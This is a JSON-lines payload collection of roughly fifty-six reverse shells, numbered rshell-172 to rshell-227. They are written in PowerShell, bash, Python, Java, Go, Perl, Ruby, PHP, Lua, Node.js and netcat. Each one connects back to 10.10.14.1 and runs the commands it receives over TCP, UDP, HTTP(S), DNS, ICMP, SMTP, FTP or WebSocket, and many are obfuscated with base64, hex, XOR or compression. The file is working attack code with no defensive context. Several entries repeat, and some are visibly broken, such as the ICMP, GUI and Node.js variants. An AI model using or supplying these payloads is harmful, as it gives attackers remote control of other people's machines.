{"id":"rshell-172","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-173","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/bash\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing bash.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java","bash"]}
{"id":"rshell-174","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-175","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-176","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Web.HttpUtility]::UrlEncode($o));$m.Send($e)","description":"PowerShell SMTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","urlencode"]}
{"id":"rshell-177","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_DGRAM,getprotobyname(\"udp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));while(<S>){chomp;system($_);}'","description":"Perl UDP reverse shell with command execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["udp","perl"]}
{"id":"rshell-178","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o))),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","base64"]}
{"id":"rshell-179","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=[cmd].pack(\"H*\").chomp;IO.popen(cmd,\"r\"){|io|c.print io.read.unpack(\"H*\")[0]}end'","description":"Ruby TCP reverse shell with hex-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","hex"]}
{"id":"rshell-180","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell gRPC reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","base64"]}
{"id":"rshell-181","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-182","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","base64"]}
{"id":"rshell-183","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-184","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell GUI reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","urlencode"]}
{"id":"rshell-185","language":"lua","payload":"lua -e 'local s=require(\"socket\").tcp();s:connect(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(require(\"zlib\").compress(o));end'","description":"Lua TCP reverse shell with compressed output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","lua","obfuscated","compressed"]}
{"id":"rshell-186","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes('$c=New-Object Net.Sockets.TCPClient(\"10.10.14.1\",4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+\"PS \"+(pwd).Path+\"> \";$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()'),[Func[byte,byte]]{param($b);$b -bxor 0x3C})));iex $x","description":"Obfuscated PowerShell TCP reverse shell using XOR encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-187","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/hex\");func main(){c,_:=net.Dial(\"udp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=hex.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(hex.EncodeToString(out)))}}","description":"Go UDP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","go","obfuscated","hex"]}
{"id":"rshell-188","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($wc.DownloadString('https://10.10.14.1:8443/cmd')));$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell HTTPS reverse shell with Base64-encoded input/output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","base64"]}
{"id":"rshell-189","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(require('zlib').inflateSync(Buffer.from(d.toString(),'base64')).toString(),(e,o)=>s.write(Buffer.from(require('zlib').deflateSync(o).toString('base64')))))","description":"Node.js TCP reverse shell with compressed Base64 input/output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","nodejs","obfuscated","base64","compressed"]}
{"id":"rshell-190","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-191","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|base64 -d|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","base64"]}
{"id":"rshell-192","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([byte[]]$b[0..($i-1)],[Func[byte,byte]]{param($b);$b -bxor 0x5A})));$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with XOR-encoded input.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","xor"]}
{"id":"rshell-193","language":"python","payload":"python3 -c 'import socket,os,binascii;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=binascii.unhexlify(d).decode();p=os.popen(c);s.send(binascii.hexlify(p.read().encode()))'","description":"Python TCP reverse shell with hex-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","hex"]}
{"id":"rshell-194","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-195","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(urldecode($c),$o);foreach($o as $l){fwrite($s,urlencode($l));}}'","description":"PHP TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","urlencode"]}
{"id":"rshell-196","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($d.AddressList[0].IPAddressToString));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with Base64-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","base64"]}
{"id":"rshell-197","language":"netcat","payload":"nc 10.10.14.1 4444 -e /bin/bash | xxd -p | nc 10.10.14.1 4445","description":"Netcat TCP reverse shell with hex-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["tcp","netcat","obfuscated","hex"]}
{"id":"rshell-198","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-199","language":"java","payload":"import java.net.*;import java.io.*;import java.util.zip.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/sh\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing a shell.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java"]}
{"id":"rshell-200","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["websocket","powershell","obfuscated","base64"]}
{"id":"rshell-201","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|xxd -r -p|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","hex"]}
{"id":"rshell-202","language":"powershell","payload":"$m=[System.Net.Mail.SmtpClient]::new('10.10.14.1',25);$c='cmd'+(Get-Random);$o=(Invoke-Expression $c 2>&1|Out-String);$e=New-Object System.Net.Mail.MailMessage('a@b.c',$c,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$m.Send($e)","description":"PowerShell SMTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["smtp","powershell","obfuscated","base64"]}
{"id":"rshell-203","language":"perl","payload":"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.10.14.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'","description":"Perl TCP reverse shell with bash execution.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","perl","bash"]}
{"id":"rshell-204","language":"powershell","payload":"$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/cmd');$f.Method=[System.Net.WebRequestMethods+Ftp]::DownloadFile;$r=$f.GetResponse();$s=$r.GetResponseStream();$b=New-Object IO.StreamReader($s);$c=$b.ReadToEnd();$o=(iex $c 2>&1|Out-String);$f=[System.Net.FtpWebRequest]::Create('ftp://10.10.14.1:21/out');$f.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile;$w=$f.GetRequestStream();$w.Write([System.Text.Encoding]::ASCII.GetBytes([System.Web.HttpUtility]::UrlEncode($o)),0,$o.Length);$w.Close()","description":"PowerShell FTP reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["ftp","powershell","obfuscated","urlencode"]}
{"id":"rshell-205","language":"ruby","payload":"ruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.1\",4444);while(cmd=c.gets);cmd=URI.decode(cmd);IO.popen(cmd,\"r\"){|io|c.print URI.encode(io.read)}end'","description":"Ruby TCP reverse shell with URL-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","ruby","obfuscated","urlencode"]}
{"id":"rshell-206","language":"powershell","payload":"$g=[Grpc.Core.Channel]::new('10.10.14.1:50051', [Grpc.Core.ChannelCredentials]::Insecure);$c=New-Object Grpc.Core.CallInvoker($g);$r=$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,'cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$c.BlockingUnaryCall([Grpc.Core.Method]::new('Cmd','Exec','String','String'),$null,$null,[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell gRPC reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["grpc","powershell","obfuscated","base64"]}
{"id":"rshell-207","language":"python","payload":"python3 -c 'import socket,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=base64.b64decode(d).decode();p=os.popen(c);s.send(base64.b64encode(p.read().encode()))'","description":"Python TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","base64"]}
{"id":"rshell-208","language":"powershell","payload":"$m=[System.Messaging.MessageQueue]::new('.\private$\cmd');$c=$m.Receive().Body;$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Messaging.Message]::new([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));[System.Messaging.MessageQueue]::new('.\private$\out').Send($r)","description":"PowerShell MSMQ reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["msmq","powershell","obfuscated","base64"]}
{"id":"rshell-209","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
{"id":"rshell-210","language":"powershell","payload":"$r=[System.Windows.Forms.MessageBox]::Show('cmd');$o=(Invoke-Expression $r 2>&1|Out-String);$r=[System.Windows.Forms.MessageBox]::Show([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))","description":"PowerShell GUI reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["gui","powershell","obfuscated","base64"]}
{"id":"rshell-211","language":"lua","payload":"lua -e 'local s=require(\"socket\").udp();s:setpeername(\"10.10.14.1\",4444);while true do local c=s:receive();local f=io.popen(c,\"r\");local o=f:read(\"*a\");f:close();s:send(require(\"zlib\").compress(o));end'","description":"Lua UDP reverse shell with compressed output.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","lua","obfuscated","compressed"]}
{"id":"rshell-212","language":"powershell","payload":"$x=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromHexString('24636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e536f636b6574732e544350436c69656e74282731302e31302e31342e31272c34343434293b2473747265616d203d2024636c69656e742e47657453747265616d28293b5b627974655b5d5d246279746573203d20302e2e36353533357c257b307d3b7768696c6528282469203d202473747265616d2e52656164282462797465732c20302c202462797465732e4c656e6774682929202d6e652030297b2464617461203d20284e65772d4f626a656374202d547970654e616d652053797374656d2e546578742e4153434949456e636f64696e67292e476574537472696e67282462797465732c302c202469293b2473656e646261636b203d202869657820246461746120323e2631207c204f75742d537472696e6720293b2473656e646261636b32203d202473656e646261636b202b202750532027202b2028707764292e50617468202b20273e20273b2473656e6462797465203d20285b746578742e656e636f64696e675d3a3a4153434949292e4765744279746573282473656e646261636b32293b2473747265616d2e5772697465282473656e64627974652c302c2473656e64627974652e4c656e677468293b2473747265616d2e466c7573682829297d3b24636c69656e742e436c6f73652829'));iex $x","description":"Obfuscated PowerShell TCP reverse shell using hex encoding.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["tcp","powershell","obfuscated","hex"]}
{"id":"rshell-213","language":"go","payload":"package main;import(\"net\";\"os/exec\";\"encoding/base64\");func main(){c,_:=net.Dial(\"tcp\",\"10.10.14.1:4444\");for{b:=make([]byte,1024);n,_:=c.Read(b);cmd,_:=base64.StdEncoding.DecodeString(string(b[:n]));out,_:=exec.Command(\"bash\",\"-c\",string(cmd)).Output();c.Write([]byte(base64.StdEncoding.EncodeToString(out)))}}","description":"Go TCP reverse shell with Base64-encoded commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","go","obfuscated","base64"]}
{"id":"rshell-214","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$c=$wc.DownloadString('https://10.10.14.1:8443/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('https://10.10.14.1:8443/out',[System.Web.HttpUtility]::UrlEncode($o))","description":"PowerShell HTTPS reverse shell with URL-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["https","powershell","obfuscated","urlencode"]}
{"id":"rshell-215","language":"nodejs","payload":"require('net').createConnection(4444,'10.10.14.1').on('data',d=>require('child_process').exec(d.toString(),(e,o)=>s.write(Buffer.from(o))))","description":"Node.js TCP reverse shell with standard output.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","nodejs"]}
{"id":"rshell-216","language":"powershell","payload":"$u=[System.Net.Sockets.UdpClient]::new('10.10.14.1',4444);$b=[byte[]]::new(65535);$d=$u.Receive([ref]$b);$c=[System.Text.Encoding]::ASCII.GetString($b,0,$d.Length);$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$u.Send($r,$r.Length)","description":"PowerShell UDP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["udp","powershell","obfuscated","base64"]}
{"id":"rshell-217","language":"bash","payload":"bash -c 'exec 3<>/dev/udp/10.10.14.1/4444;while read line <&3;do echo $line|xxd -r -p|bash >&3 2>&3;done'","description":"Bash UDP reverse shell with hex-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["udp","bash","obfuscated","hex"]}
{"id":"rshell-218","language":"powershell","payload":"$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();$b=New-Object Byte[] 65535;while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$p=$o+'PS '+(pwd).Path+'> ';$e=([text.encoding]::ASCII).GetBytes($p);$s.Write($e,0,$e.Length);$s.Flush()};$c.Close()","description":"PowerShell TCP reverse shell with standard command execution.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["tcp","powershell"]}
{"id":"rshell-219","language":"python","payload":"python3 -c 'import socket,os,zlib;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.1\",4444));while True:d=s.recv(1024);c=zlib.decompress(d).decode();p=os.popen(c);s.send(zlib.compress(p.read().encode()))'","description":"Python TCP reverse shell with zlib-compressed commands.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","python","obfuscated","compressed"]}
{"id":"rshell-220","language":"powershell","payload":"$wc=New-Object System.Net.WebClient;while($true){$c=$wc.DownloadString('http://10.10.14.1:8080/cmd');$o=(Invoke-Expression $c 2>&1|Out-String);$wc.UploadString('http://10.10.14.1:8080/out',[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)))}","description":"PowerShell HTTP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["http","powershell","obfuscated","base64"]}
{"id":"rshell-221","language":"php","payload":"php -r '$s=fsockopen(\"10.10.14.1\",4444);while($c=fgets($s)){exec(base64_decode($c),$o);foreach($o as $l){fwrite($s,base64_encode($l));}}'","description":"PHP TCP reverse shell with Base64-encoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","php","obfuscated","base64"]}
{"id":"rshell-222","language":"powershell","payload":"$d=[System.Net.Dns]::GetHostEntry('cmd.10.10.14.1');$c=[System.Text.Encoding]::ASCII.GetString([System.Linq.Enumerable]::ToArray([System.Linq.Enumerable]::Select([System.Text.Encoding]::ASCII.GetBytes($d.AddressList[0].IPAddressToString),[Func[byte,byte]]{param($b);$b -bxor 0x5A})));$o=(Invoke-Expression $c 2>&1|Out-String);$r=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o));[System.Net.Dns]::GetHostEntry(\"$r.out.10.10.14.1\")","description":"PowerShell DNS reverse shell with XOR-encoded commands.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["dns","powershell","obfuscated","xor"]}
{"id":"rshell-223","language":"netcat","payload":"nc -u 10.10.14.1 4444 -e /bin/bash | base64 | nc -u 10.10.14.1 4445","description":"Netcat UDP reverse shell with Base64-encoded output redirection.","platform":"Linux","requires_netcat":true,"obfuscated":true,"tag":["udp","netcat","obfuscated","base64"]}
{"id":"rshell-224","language":"powershell","payload":"$p=[System.Net.NetworkInformation.Ping]::new();$c=$p.Send('10.10.14.1').RoundtripTime;$o=(Invoke-Expression $c 2>&1|Out-String);$b=[System.Text.Encoding]::ASCII.GetBytes([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($o)));$p.Send('10.10.14.1',1000,$b)","description":"PowerShell ICMP reverse shell with Base64-encoded output.","platform":"Windows","requires_netcat":false,"obfuscated":true,"tag":["icmp","powershell","obfuscated","base64"]}
{"id":"rshell-225","language":"java","payload":"import java.net.*;import java.io.*;public class RShell{public static void main(String[]a)throws Exception{Socket s=new Socket(\"10.10.14.1\",4444);Process p=Runtime.getRuntime().exec(\"/bin/bash\");InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}p.destroy();s.close();}}","description":"Java TCP reverse shell executing bash.","platform":"Linux","requires_netcat":false,"obfuscated":false,"tag":["tcp","java","bash"]}
{"id":"rshell-226","language":"powershell","payload":"$ws=[System.Net.WebSockets.ClientWebSocket]::new();$ct=[System.Threading.CancellationToken]::new($false);$ws.ConnectAsync([System.Uri]::new('ws://10.10.14.1:8080'),$ct).Wait();$b=New-Object Byte[] 65535;$m=New-Object System.ArraySegment[byte]($b);$r=$ws.ReceiveAsync($m,$ct).Result;$c=[System.Text.Encoding]::ASCII.GetString($b,0,$r.Count);$o=(iex $c 2>&1|Out-String);$e=([text.encoding]::ASCII).GetBytes($o);$ws.SendAsync([System.ArraySegment[byte]]::new($e),[System.Net.WebSockets.WebSocketMessageType]::Text,$true,$ct).Wait()","description":"PowerShell WebSocket reverse shell with standard output.","platform":"Windows","requires_netcat":false,"obfuscated":false,"tag":["websocket","powershell"]}
{"id":"rshell-227","language":"bash","payload":"bash -c 'exec 5<>/dev/tcp/10.10.14.1/4444;while read line <&5;do echo $line|base64 -d|bash >&5 2>&5;done'","description":"Bash TCP reverse shell with Base64-decoded command execution.","platform":"Linux","requires_netcat":false,"obfuscated":true,"tag":["tcp","bash","obfuscated","base64"]}
